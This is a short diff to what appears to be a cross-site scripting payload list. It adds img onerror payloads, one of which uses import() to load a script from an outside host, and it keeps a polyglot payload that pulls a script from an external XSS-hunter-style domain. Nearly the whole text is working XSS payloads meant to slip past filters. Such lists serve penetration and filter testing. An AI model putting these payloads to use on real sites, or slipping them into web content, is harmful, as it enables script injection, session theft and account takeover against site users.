@@ -22,7 +22,8 @@
 
 <img src=x onerror=alert(1)>
 '-alert(1)-';"-alert(2)-"//"><svg/onload=alert(3)>
-<img src=totallyfake onerror=import(‘//domain.com/‘);//
+<img src=totallyfake onerror=alert(1);//
+<img src=x onerror=import(‘//domain.com/‘);//
 '"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//ChiragXSS.xSs.ht></scripT>
 
 
